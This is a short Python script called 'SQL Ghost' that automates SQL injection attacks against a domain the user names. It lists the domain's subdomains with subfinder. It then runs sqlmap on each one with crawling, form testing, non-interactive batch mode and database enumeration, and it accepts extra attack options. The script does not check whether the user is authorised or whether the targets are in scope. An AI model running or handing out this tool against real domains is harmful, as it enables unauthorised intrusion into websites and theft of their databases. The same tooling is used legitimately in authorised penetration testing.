import subprocess
from colorama import init, Fore

# Initialize colorama
init(autoreset=True)

# Display a welcome message with ASCII art
def display_welcome():
    welcome_art = r"""
  ▄████  ██░ ██   ▒█████  ██████ ▄▄▄█████▓
 ██▒ ▀█▒▓██░ ██▒▒██▒  ██▒▒██    ▒ ▓  ██▒ ▓▒
▒██░▄▄▄░▒██▀▀██░▒██░  ██▒░ ▓██▄   ▒ ▓██░ ▒░
░▓█  ██▓░▓█ ░██ ▒██   ██░  ▒   ██▒░ ▓██▓ ░
░▒▓███▀▒░▓█▒░██▓░ ████▓▒░▒██████▒▒  ▒██▒ ░
 ░▒   ▒  ▒ ░░▒░▒░ ▒░▒░▒░ ▒ ▒▓▒ ▒ ░  ▒ ░░
  ░   ░  ▒ ░▒░ ░  ░ ▒ ▒░ ░ ░▒  ░ ░    ░
░ ░   ░  ░  ░░ ░░ ░ ░ ▒  ░  ░  ░    ░
      ░  ░  ░  ░    ░ ░        ░
"""
    print(Fore.CYAN + welcome_art)
    print(Fore.GREEN + "Welcome to SQL Ghost: A Simple SQL Injection Tool\n")
    print(Fore.YELLOW + "Please enter a domain to begin subdomain enumeration.\n")

# Discover subdomains using subfinder
def find_subdomains(domain):
    print(Fore.CYAN + f"Enumerating subdomains for {domain} using subfinder...")
    try:
        result = subprocess.run(
            ["subfinder", "-d", domain, "-silent"],
            capture_output=True,
            text=True,
            check=True
        )
        subdomains = result.stdout.splitlines()
        print(Fore.GREEN + "\nDiscovered Subdomains:")
        for subdomain in subdomains:
            print(Fore.YELLOW + f" - {subdomain}")
        return subdomains
    except FileNotFoundError:
        print(Fore.RED + "Error: subfinder is not installed or not found in PATH.")
        exit(1)
    except subprocess.CalledProcessError as e:
        print(Fore.RED + f"Error executing subfinder: {e}")
        return []

# Run SQLMap for each subdomain
def run_sqlmap(url, sql_command):
    print(Fore.BLUE + f"\nRunning SQLMap on {url}...")
    command = ["sqlmap", "-u", url, "--crawl=2", "--forms", "--batch", "--dbs"] + sql_command.split()
    try:
        subprocess.run(command, check=True)
    except FileNotFoundError:
        print(Fore.RED + "SQLMap is not installed or not found in PATH. Please install it and try again.")
        exit(1)
    except subprocess.CalledProcessError as e:
        print(Fore.RED + f"Error executing SQLMap on {url}: {e}")

# Main execution
if __name__ == "__main__":
    display_welcome()

    domain = input("Enter the domain to test for SQL injection: ").strip()
    if not domain:
        print(Fore.RED + "Invalid domain. Please enter a valid domain.")
        exit(1)

    # Step 1: Discover subdomains
    subdomains = find_subdomains(domain)

    # Step 2: Run SQL injection tests on all discovered subdomains
    sql_command = input(Fore.CYAN + "Enter additional SQLMap options (leave empty for default): ").strip()

    for subdomain in subdomains:
        url = f"http://{subdomain}/"
        run_sqlmap(url, sql_command)
